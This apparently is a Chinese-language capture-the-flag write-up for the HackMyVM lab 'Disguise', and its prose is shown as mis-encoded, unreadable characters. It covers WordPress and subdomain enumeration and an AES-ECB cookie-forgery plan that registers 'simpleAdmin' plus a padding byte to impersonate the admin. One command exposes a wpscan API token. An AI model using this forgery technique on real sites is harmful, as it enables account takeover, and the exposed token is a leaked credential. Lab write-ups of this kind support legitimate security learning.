---
title: Disguise
author: hgbe02
date: 2025-06-21 03:00:26 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web,crypto,CVE-2025-21548]  
permalink: "/Hackmyvm/Disguise.html"
---

# Disguise

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258202.png" alt="image-20250619011445950" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258204.png" alt="image-20250620145229604" style="zoom: 50%;" />

## ä¿¡æ¯æœé›†

### ç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.100:22
Open 192.168.10.100:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKpc4iyFhIzxDvlJoPvgE9rRlFPOqHm4EkLgqXQkVf31csyjpvJgyZpTgr4gYV3oztsMmQbIj+nFGD+L5pQfaSXtAdxKpqt4D/MnFqVKP6KKGFhATWMCDzGXRaXQyaF7dOq49vkIoptczAU2af2PfwycA3aaI/lNPOYSHPRufkm102lE/lHZzNbXh0yJJXy9RJaqELeAibmqdrHFNpXFT8qAvsQrz/6IKJkia4JLdVbfeMdZBOQ9lIlQg+2VfKXp7pF7kGZKKttIThc8ROqlcOaxlmuC5oKEgFQP7obty1+6fx/QIuNn3D05FeQMqbvJfFZF1dE2IH4WEbFWRGH6w1
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYupwIuJVRtRMDrYZ6fR/3p5E5vsqXADwGAoZ2RW5vKPxDV3j/+QjGbnRDj1iD5/iwZxxlUggSr5raZfzAHrZA=
|   256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOshh8VG4l9hWlVYWfAvLuWuwPEdiF8EXmm5BFib/+q
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Maintenance
MAC Address: 08:00:27:B4:46:05 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ç›®å½•æ‰«æ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html txt php 2>/dev/null
                                                                                                                                                                                             
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
503      GET      115l      268w     2449c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      321c http://192.168.10.100/wp-content => http://192.168.10.100/wp-content/
200      GET        0l        0w        0c http://192.168.10.100/wp-content/index.php
301      GET        9l       28w      328c http://192.168.10.100/wp-content/themes => http://192.168.10.100/wp-content/themes/
301      GET        9l       28w      329c http://192.168.10.100/wp-content/uploads => http://192.168.10.100/wp-content/uploads/
200      GET        0l        0w        0c http://192.168.10.100/wp-content/themes/index.php
200      GET      384l     3177w    19903c http://192.168.10.100/license.txt
```

ä¸€æ‰«å°±å¡ä½äº†ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯å‘ç°æ˜¯`wordpress`ç«™ç‚¹ã€‚

### wordpressæ‰«æ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ cmseek --url http://192.168.10.100

[i] Updating CMSeeK result index...
[*] Report index updated successfully!

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  CMS Detection And Deep Scan  [+] 

[i] Scanning Site: http://192.168.10.100/
[*] CMS Detected, CMS ID: wp, Detection method: header
[*] Version Detected, WordPress Version 6.8.1
[i] Checking user registration status
[i] Starting passive plugin enumeration
[x] No plugins enumerated!
[i] Starting passive theme enumeration
[*] 2 themes detected!
[i] Starting Username Harvest
[i] Harvesting usernames from wp-json api
[*] Found user from wp-json : simpleadmin
[i] Harvesting usernames from jetpack public api
[!] No results from jetpack api... maybe the site doesn't use jetpack
[i] Harvesting usernames from wordpress author Parameter
[*] Found user from source code: simpleadmin
[*] 1 Usernames was enumerated
[i] Checking version vulnerabilities using wpvulns.com
[x] Error Retriving data from wpvulndb

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

 â”â”Target: 192.168.10.100
 â”ƒ
 â” â”€â”€ CMS: WordPress
 â”ƒ    â”‚
 â”ƒ    â”œâ”€â”€ Version: 6.8.1
 â”ƒ    â•°â”€â”€ URL: https://wordpress.org
 â”ƒ
 â” â”€â”€[WordPress Deepscan]
 â”ƒ    â”‚
 â”ƒ    â”œâ”€â”€ Readme file found: http://192.168.10.100//readme.html
 â”ƒ    â”œâ”€â”€ License file: http://192.168.10.100//license.txt
 â”ƒ    â”œâ”€â”€ Uploads directory has listing enabled: http://192.168.10.100//wp-content/uploads
 â”ƒ    â”‚
 â”ƒ    â”œâ”€â”€ Themes Enumerated: 2
 â”ƒ    â”‚    â”‚
 â”ƒ    â”‚    â”œâ”€â”€ Theme: newscrunch
 â”ƒ    â”‚    â”‚   â”‚
 â”ƒ    â”‚    â”‚   â”œâ”€â”€ Version: 6.8.1
 â”ƒ    â”‚    â”‚   â•°â”€â”€ URL: http://192.168.10.100//wp-content/themes/newscrunch
 â”ƒ    â”‚    â”‚
 â”ƒ    â”‚    â•°â”€â”€ Theme: newsblogger
 â”ƒ    â”‚        â”‚
 â”ƒ    â”‚        â”œâ”€â”€ Version: 6.8.1
 â”ƒ    â”‚        â•°â”€â”€ URL: http://192.168.10.100//wp-content/themes/newsblogger
 â”ƒ    â”‚
 â”ƒ    â”‚
 â”ƒ    â”œâ”€â”€ Usernames harvested: 1
 â”ƒ    â”‚    â•°â”€â”€ simpleadmin
 â”ƒ    â”‚
 â”ƒ
 â” â”€â”€ Result: /home/kali/temp/Disguise/Result/192.168.10.100/cms.json
 â”ƒ
 â”—â”Scan Completed in 1.21 Seconds, using 46 Requests



 CMSeeK says ~ shalom
```

å°è¯•ä½¿ç”¨`wpscan`è¿›è¡Œæµ‹è¯•ï¼šhttps://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ wpscan --url http://$IP/ -e vp --plugins-detection mixed --api-token xxxxxxxxxxxxxxx
_______________________________________________________________
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.10.100/wp-content/plugins/akismet/
 | Latest Version: 5.4
 | Last Updated: 2025-05-07T16:30:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.10.100/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.
 
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ wpscan --url http://$IP/ -e u --api-token QgjGEj5XxGc1lJEYv4jXvhLKKWIbJqyqIUvjQnb84Jc
-------------------------------
[i] User(s) Identified:

[+] simpleadmin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.10.100/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] simpleAdmin
 | Found By: Rss Generator (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

æ‰¾åˆ°äº†ä¿©ç”¨æˆ·`simpleadmin`ä»¥åŠ`simpleAdmin`ï¼Œå‰è€…å¤§æ¦‚ç‡ä¸º`wordpress`çš„ç”¨æˆ·ï¼Œåè€…æœªçŸ¥ã€‚

## æ¼æ´å‘ç°

### è¸©ç‚¹

è®¿é—®ä¹Ÿæ…¢çš„ä¸€æ‰¹ï¼Œå¯èƒ½æ˜¯åšäº†å•¥é…ç½®ï¼Ÿé‡å¯é¶æœºè¿›è¡Œæµ‹è¯•ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258205.png" alt="image-20250620150748888" style="zoom:50%;" />

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ whatweb http://$IP/
http://192.168.10.100/ [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[192.168.10.100], JQuery[3.7.1], MetaGenerator[WordPress 6.8.1], Script[speculationrules,text/javascript], Title[Just a simple wordpress site], UncommonHeaders[link], WordPress[6.8.1], X-UA-Compatible[IE=edge]
```

çœ‹çœ‹å¸¸ç”¨å¾—æ•æ„Ÿç›®å½•ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ curl -s http://$IP/robots.txt                                     
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

æŸ¥çœ‹ä¸»é¡µæºä»£ç ï¼Œå‘ç°åŸŸåè§£æï¼š

```text
192.168.10.100   disguise.hmv
```

### FUZZ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ ffuf -u "http://192.168.10.100" -H "Host: FUZZ.disguise.hmv" -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 11916 2>/dev/null
www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 327ms]
dark                    [Status: 200, Size: 873, Words: 124, Lines: 19, Duration: 185ms]
```

æœ‰éšè—åŸŸåï¼Œæ·»åŠ ä¸€ä¸‹ï¼š

```text
192.168.10.100   disguise.hmv  dark.disguise.hmv
```

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ gobuster dir -u http://dark.disguise.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dark.disguise.hmv
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 282]
/index.php            (Status: 200) [Size: 873]
/.html                (Status: 403) [Size: 282]
/login.php            (Status: 200) [Size: 1134]
/register.php         (Status: 200) [Size: 2103]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/images               (Status: 301) [Size: 323] [--> http://dark.disguise.hmv/images/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/captcha.php          (Status: 200) [Size: 367]
/functions.php        (Status: 200) [Size: 0]
/manager              (Status: 301) [Size: 324] [--> http://dark.disguise.hmv/manager/]
/.php                 (Status: 403) [Size: 282]
/.html                (Status: 403) [Size: 282]
/server-status        (Status: 403) [Size: 282]
```

>  æˆ‘è¿™é‡Œå‡ºç°ä¿®æ”¹`hosts`å¤±æ•ˆï¼Œè®¿é—® 502ï¼ŒåæŸ¥æ˜æ˜¯å› ä¸ºå¼€äº†ä»£ç†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚

### AES-128 ECBä¼ªé€ cookie

æ‰“å¼€æ–°åŸŸåçœ‹ä¸€ä¸‹ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258206.png" alt="image-20250620172312774" style="zoom:50%;" />

å°è¯•è¿›è¡Œæ³¨å†Œï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258207.png" alt="image-20250620172346999" style="zoom:50%;" />

> æ€ä¹ˆæ„Ÿè§‰åƒ cursor å†™çš„ï¼Œå“ˆå“ˆå“ˆå“ˆã€‚

```text
username
password
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258208.png" alt="image-20250620172449455" style="zoom:50%;" />

æ²¡ä¸œè¥¿ï¼Œä½†æ˜¯ cookie çœ‹ä¸Šå»æœ‰ç‚¹ä¸œè¥¿ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258209.png" alt="image-20250620172701309" style="zoom:50%;" />

```text
dark_session: %2BRofqaf35NZSFE50nowHdw%3D%3D
PHPSESSID: 1j48gohlqpqf9knohfbac7bm0q
```

å°è¯•è¿›è¡Œç ´è¯‘ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258210.png" alt="image-20250620172848403" style="zoom:50%;" />

çœ‹ä¸Šå»åƒæ˜¯`base64`ä½†æ˜¯åˆä¸ä¸€æ ·ï¼Œæœ‰` + `ï¼Œå°è¯•å†åˆ›å»ºä¸€ä¸ªè´¦å·å¯¹æ¯”ä¸€ä¸‹ï¼š

```text
kali
kali
```

cookie åˆ™ä¸ºï¼š

```text
dark_session: NL8B2mVVM8jKIu9pbCLIyw%3D%3D
PHPSESSID: 1j48gohlqpqf9knohfbac7bm0q
```

è§£ç ä»¥ååˆ†åˆ«ä¸ºï¼š

```text
+Rofqaf35NZSFE50nowHdw==
NL8B2mVVM8jKIu9pbCLIyw==
```

#### AES-128åŠ å¯†

ä½æ•°ä¸€æ ·ï¼Œç”±äºå¯†ç æˆªç„¶ä¸ä¸€æ ·ï¼Œçœ‹ä¸å‡ºå…³ç³»ï¼Œå°è¯•å¤šæ³¨å†Œå‡ ä¸ªï¼š

```bash
aaaa:bbbb:4
aaaaaaaa:bbbbbbbb:8
aaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbb:16
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb:32
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
========>
e3Opvt7372tUQCmdavBBxA%3D%3D
5SKl5Bbstz3e0GrQ8QBCkA%3D%3D
FUoxH12UY%2FN58pkbRNAAfw3VkIUgMs7BjIoGhLHIvrE%3D
FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTEN1ZCFIDLOwYyKBoSxyL6x

e3Opvt7372tUQCmdavBBxA==
5SKl5Bbstz3e0GrQ8QBCkA==
FUoxH12UY/N58pkbRNAAfw3VkIUgMs7BjIoGhLHIvrE=
FUoxH12UY/N58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTEN1ZCFIDLOwYyKBoSxyL6x
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258211.png" alt="image-20250620221750970" style="zoom:50%;" />

å‰ç«¯è¿›è¡Œæ ¡éªŒäº†ï¼Œå¯ä»¥ç¦ç”¨æ‰ jsï¼Œå†æ³¨å†Œå³å¯ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258212.png" alt="image-20250620222008455" style="zoom:50%;" />

â€‹	å½“è¿›è¡Œåˆ°æœ€åä¸€ä¸ªçš„æ—¶å€™æŠ¥é”™äº†ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258213.png" alt="image-20250620222247787" style="zoom:33%;" />

â€‹      å‘ç°åœ¨ç”¨æˆ·åæˆ–å¯†ç é•¿çš„æ—¶å€™ï¼Œå‰é¢çš„å‰ç¼€æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯åé¢æˆªç„¶ä¸åŒï¼Œä¸”å½“ç”¨æˆ·åæˆ–å¯†ç é•¿åº¦ä¸åŒæ—¶ï¼Œcookieé•¿åº¦å¯èƒ½ç›¸åŒï¼Œè¯´æ˜å¯èƒ½æ˜¯å—åŠ å¯†æ–¹å¼ï¼Œåœ¨é•¿åº¦ä¸å¤Ÿçš„æ—¶å€™è¿›è¡Œå¡«å……ï¼Œè¾¾åˆ°ä¸€å®šä½æ•°çš„æ—¶å€™è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªä¸€ä¸ªæ³¨å†Œå¾—åˆ°é‚£ä¸ªä½æ•°ï¼Œå¯ä»¥åŸºæœ¬ç¡®å®šæ˜¯ AES128 åŠ å¯†ã€‚

> |   **ç‰¹æ€§**   |            **AES-128**             |        **AES-192**         |          **AES-256**           |
> | :----------: | :--------------------------------: | :------------------------: | :----------------------------: |
> | **å¯†é’¥é•¿åº¦** |         128 ä½ï¼ˆ16 å­—èŠ‚ï¼‰          |     192 ä½ï¼ˆ24 å­—èŠ‚ï¼‰      |       256 ä½ï¼ˆ32 å­—èŠ‚ï¼‰        |
> | **åŠ å¯†è½®æ•°** |               10 è½®                |           12 è½®            |             14 è½®              |
> | **å®‰å…¨å¼ºåº¦** | åŸºç¡€å®‰å…¨æ€§ï¼ˆæŠ—æš´åŠ›ç ´è§£éœ€ 2128 æ¬¡ï¼‰ |   ä¸­ç­‰å®‰å…¨æ€§ï¼ˆ2192 æ¬¡ï¼‰    |     æœ€é«˜å®‰å…¨æ€§ï¼ˆ2256 æ¬¡ï¼‰      |
> | **æ€§èƒ½å¼€é”€** |          æœ€ä½ï¼ˆè®¡ç®—æœ€å¿«ï¼‰          |            ä¸­ç­‰            |        æœ€é«˜ï¼ˆè®¡ç®—æœ€æ…¢ï¼‰        |
> | **é€‚ç”¨åœºæ™¯** |  ç§»åŠ¨è®¾å¤‡ã€å®æ—¶é€šä¿¡ï¼ˆå¦‚ TLS 1.3ï¼‰  | ä¼ä¸šçº§æ•°æ®åŠ å¯†ï¼ˆè¾ƒå°‘ä½¿ç”¨ï¼‰ | å†›äº‹ã€é‡‘èã€åŒºå—é“¾ç­‰é«˜æ•æ„Ÿé¢†åŸŸ |

â€‹      ç„¶åæ„è¯†åˆ°ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œè¿™ä¸ªcookieåº”è¯¥å’Œå¯†ç æ²¡å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦æ„é€ çš„æ­£æ˜¯ç®¡ç†å‘˜`simpleAdmin`ï¼ˆä¿¡æ¯æœé›†åˆ°çš„ï¼‰çš„cookieï¼Œå¦‚æœæœ‰å¯†ç å°±ä¸éœ€è¦è¿›è¡Œæ„é€ äº†ã€‚ã€‚ã€‚ã€‚ã€‚

å†æ³¨å†Œå‡ ä¸ªæ‰¾åˆ°æ°å¥½å¤šåˆ†ä¸€ä¸ªå—çš„é‚£ä¸ªç‰¹æ®Šé•¿åº¦ï¼š

```bash
aaaaaaaaaa ==> Hxs4O2FVu%2FQM9EqHsnvrOA%3D%3D ==> Hxs4O2FVu/QM9EqHsnvrOA==
aaaaaaaaaaaa ==> FUoxH12UY%2FN58pkbRNAAf8JwkfrsOdSxW16pbszGJLY%3D ==> FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY=
                                                                      FUoxH12UY/N58pkbRNAAfw3VkIUgMs7BjIoGhLHIvrE=
aaaaaaaaaaa ==> OuQ8RKZ9v61RFPShspbyzg%3D%3D ==> OuQ8RKZ9v61RFPShspbyzg==
```

å¯ä»¥ç›´åˆ°é•¿åº¦ä¸º 12 æ—¶å€™åŠ å¯†å¤šäº†ä¸€å—ï¼Œå¯çŸ¥å¡«å……äº† 5 ä¸ªå­—èŠ‚çš„æœªçŸ¥æ•°æ®ï¼Œ12 + 5 -16 = 1 ,å¤šäº†ä¸€ä¸ªå­—èŠ‚ï¼Œæ•…æ–°å¡«å……äº†ä¸€ä¸ªå—ã€‚

#### ECB åŠ å¯†

å°è¯•åˆ›å»ºä¸€ä¸ªå¾ˆé•¿ä¸”é‡å¤çš„ç”¨æˆ·ï¼Œä½¿ä¸¤ä¸ªå—çš„é•¿åº¦ç›¸åŒï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨é‡å¤ï¼Œå€Ÿæ­¤åˆ¤æ–­æ˜¯å“ªç§å¡«å……æ–¹å¼ï¼š

```bash
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(40)
FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTG6fpyT%2BeTDSMZZI3t8yCtj
FUoxH12UY/N58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTG6fpyT+eTDSMZZI3t8yCtj
# å†é•¿ä¸€ç‚¹ï¼Œå¹¶æœªå¤šåˆ†å‡ºä¸€ä¸ªå—ã€‚ã€‚ã€‚ã€‚
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(45)
FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTFCn3dW789xt%2FWTDpdh540xx5DP1Yb6SI4MM0Hr7sTwjg%3D%3D
FUoxH12UY/N58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTFCn3dW789xt/WTDpdh540xx5DP1Yb6SI4MM0Hr7sTwjg==
```

å°†å¯†æ–‡æ”¹ä¸º`url > base64 > hex`è§£å¯†å³å¯çœ‹åˆ°é‡å¤ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258214.png" alt="image-20250620235035507" style="zoom:50%;" />

å¯ä»¥ç¡®å®šæ˜¯`ECB`åŠ å¯†æ–¹å¼ï¼Œå…¶ä»–åŠ å¯†æ–¹å¼åŸºæœ¬ä¸Šéƒ½ä¸ä¼šå‡ºç°é‡å¤ï¼Œä¼šå‡ºç°è½®è½¬ä¹‹ç±»çš„å¥½åƒã€‚

#### PKCS7å¡«å……

æœ‰ä¸¤ç§å¡«å……æ–¹å¼çŒœæµ‹ï¼š

- **PKCS7 Padding**ï¼šå¡«å……å­—èŠ‚çš„å€¼ç­‰äºç¼ºå°‘çš„å­—èŠ‚æ•°ï¼Œ
  - ç¼º 3 å­—èŠ‚ â†’ å¡«å…… `0x03 0x03 0x03`
  - ç¼º 16 å­—èŠ‚ â†’ å¡«å…… `0x10 0x10 ... 0x10`ï¼ˆå…± 16 å­—èŠ‚ï¼‰

- **Zero Padding**ï¼šç¼ºå¤±å­—èŠ‚ç”¨ `0x00` å¡«å……ã€‚
  - ç¼º 3 å­—èŠ‚ â†’ å¡«å…… `0x00 0x00 0x00`
  - ç¼º 16 å­—èŠ‚ â†’ å¡«å…… 16 ä¸ª `0x00`

è¿™é‡Œçš„ 12 ä½å­—èŠ‚å¡«å……æˆäº†ä¿©å—ï¼Œä½†æ˜¯ 11 å´åªæœ‰ä¸€ä¸ªå—ï¼Œæ‰€ä»¥ 12 å¡«å……äº†ä¸€æ•´ä¸ªå—ï¼Œæˆ–è€…è¯´ 11 å¡«å……å®Œä¸€ä¸ªæ°å¥½æˆä¸ºä¸€ä¸ªå—ï¼Œæ•…æœ€åå¡«å……çš„æ˜¯`0x01`ï¼Œè¿˜æ·»åŠ äº†ä¸€ä¸ª 4 å­—èŠ‚é•¿åº¦çš„`salt`å€¼ï¼Œå¾ˆéš¾ç†è§£æ˜¯å—ï¼Œæˆ‘ä¹Ÿæ˜¯è¿™ä¹ˆæƒ³çš„ã€‚ã€‚

> èœç‹—meï¼šéš¾é“ä¸å¯èƒ½æ°å¥½16ä¸ªå­—èŠ‚ä¸å°±ä¸ç”¨å¡«å……äº†ï¼Ÿ
>
> ä¼Ÿå¤§çš„AIï¼šPKCS7å¡«å……è§„åˆ™æ˜¯å½“æ•°æ®é•¿åº¦ä¸è¶³å—å¤§å°æ—¶ï¼Œè¡¥è¶³åˆ°å—å¤§å°çš„æ•´æ•°å€ã€‚è€Œå¦‚æœæ•°æ®åˆšå¥½æ˜¯å—å¤§å°çš„æ•´æ•°å€ï¼Œæ¯”å¦‚AESçš„16å­—èŠ‚ï¼Œä»ç„¶éœ€è¦å¡«å……ä¸€ä¸ªå®Œæ•´çš„å—ã€‚ä¾‹å¦‚ï¼Œ16å­—èŠ‚çš„æ•°æ®ä¼šè¢«å¡«å……16ä¸ªå­—èŠ‚çš„0x10ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†åŒºåˆ†æœ‰æ•ˆæ•°æ®å’Œå¡«å……æ•°æ®ã€‚

é¢ï¼Œå¯†ç å­¦çœŸæ˜¯ä¸€é—¨ä¼Ÿï¼ˆkongï¼‰å¤§ï¼ˆbuï¼‰çš„å­¦é—®ã€‚ã€‚ã€‚ã€‚

#### ä¼ªé€ ä¸åŒç”¨æˆ·åä½†cookieç›¸åŒçš„æƒ…å†µ

è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ç›®æ ‡çš„æƒ…å†µäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ç‚¹éœ€è¦è§£å†³ï¼Œé‚£å°±æ˜¯ç›çš„ä½ç½®ï¼Œä¹‹å‰é•¿åº¦è¶…æ ‡çš„å¯†æ–‡å‰ç¼€éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸”ä¸é‡å¤ï¼Œè¯´æ˜ç›æ˜¯åœ¨æ˜æ–‡å‰é¢çš„ï¼Œæ¯”å¦‚ï¼š

```bash
FUoxH12UY/N58pkbRNAAfw3VkIUgMs7BjIoGhLHIvrE=
FUoxH12UY/N58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTEN1ZCFIDLOwYyKBoSxyL6x
```

æ‰€ä»¥ç°åœ¨æ‰€æœ‰çš„é—®é¢˜éƒ½è§£å†³äº†ï¼š

- `simpleAdmin`ä¸ºç®¡ç†å‘˜ç”¨æˆ·ï¼Œå…± 11 å­—èŠ‚
- `dark_session` ç”±`salt + username + PKCS7`å…ˆ base64 å† url ç¼–ç æ„æˆã€‚
- 4 + 11 + 1 == 4 + ï¼ˆ11 + 1ï¼‰å³`simpleAdmin`ä¸ç”¨æˆ·`simpleAdmin0x01`æ„æˆçš„å¯†æ–‡å‰é¢å®Œå…¨ç›¸åŒï¼ï¼ï¼ï¼åè€…å¤šäº†ä¸€ä¸ªå®Œå…¨ç”±`0x10`ç»„æˆçš„å¡«å……å—ï¼Œå¯ä»¥è§†è€Œä¸è§ï¼

è¿›è¡Œæ³¨å†Œï¼Œurlç¼–ç éœ€è¦ä½¿ç”¨`%01`è¿›è¡Œæ§åˆ¶ï¼Œå°è¯•è¿›è¡ŒæŠ“åŒ…ï¼š

```bash
POST /register.php HTTP/1.1
Host: dark.disguise.hmv
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Referer: http://dark.disguise.hmv/register.php
Origin: http://dark.disguise.hmv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=jpk0kguhvfp65sbi3ut4d183hs
Content-Length: 36

username=a&password=a&captcha=2JVL8C
```

è¿›è¡Œä¿®æ”¹ï¼Œæˆ‘è¿™é‡Œå› ä¸ºè¯¯æ“ä½œï¼Œå¯¼è‡´åˆ›å»ºäº†é”™è¯¯çš„ç”¨æˆ·åï¼Œåªèƒ½é‡æ–°å¯¼å…¥é¶æœºå†æ¥äº†ã€‚ã€‚ã€‚ã€‚

